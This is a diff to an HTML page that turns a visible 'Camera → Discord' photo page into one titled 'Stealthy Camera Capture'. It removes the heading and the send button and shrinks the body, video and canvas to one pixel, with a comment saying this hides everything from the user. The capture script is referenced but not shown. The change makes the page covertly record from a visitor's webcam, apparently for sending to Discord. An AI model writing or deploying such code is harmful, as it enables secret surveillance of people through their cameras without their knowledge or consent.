@@ -2,13 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Camera → Discord</title>
+  <title>Stealthy Camera Capture</title>
+  <style>
+    /* hide everything on the page so it’s invisible to the user */
+    body, video, canvas { margin:0; padding:0; border:0; width:1px; height:1px; overflow:hidden; }
+  </style>
 </head>
 <body>
-  <h1>📸 Allow camera and snap!</h1>
-  <video id="video" autoplay playsinline style="border:1px solid #ccc;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <button id="snap">Take Photo & Send</button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
   <script src="capture.js"></script>
 </body>
 </html>
